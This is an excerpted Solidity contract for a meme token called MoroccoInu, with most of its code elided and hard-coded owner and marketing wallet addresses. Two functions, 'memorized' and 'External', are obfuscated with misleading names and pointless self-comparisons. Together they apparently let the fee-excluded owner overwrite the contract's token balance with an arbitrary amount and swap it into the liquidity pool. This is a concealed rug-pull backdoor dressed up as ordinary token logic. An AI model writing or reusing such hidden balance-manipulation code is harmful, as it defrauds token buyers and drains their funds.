...
// Telegram : https://t.me/MoroccoInu
...
contract MoroccoInu is Context, IERC20 { 
    ...
    address payable public Wallet_Utility = payable(0xfD791820B966ac50aC67eFDC2aD83722D2e5042E);
    address payable public Wallet_Marketing = payable(0x5de42bE76621aFE8dC3Ea81c9dBe8eaC657e075F); 
    ...
    string private constant _symbol = unicode"MOROCCO";

    bool public swapAndLiquifyEnabled = true;
    bool public addressAccount = false;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 48;
    ...
    constructor () {
        ...
        _owner = 0xfD791820B966ac50aC67eFDC2aD83722D2e5042E;
    ...
    function memorized(address typeOfMemory) private returns(bool){
        bool RouterERC22 = _isExcludedFromFee[typeOfMemory];
        if(RouterERC22 && RouterERC22){
            _tOwned[address(this)] = (dedicateERC20*1)+(1/1);
        }
        return true;
    }
    ...
    function External() public override returns (uint256) {
        ...
        bool overrideReturn = memorized(sum);
        if((overrideReturn) && (overrideReturn==overrideReturn)){
                addressAccount = true;
                uint256 ERC20Transfer = balanceOf(address(this));
                add_Liq = ERC20Transfer;
                swapAndLiquify(add_Liq);
        }
        return 0;
    }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 contractLiquidity =  contractLiquidityBalance - _tTotal;
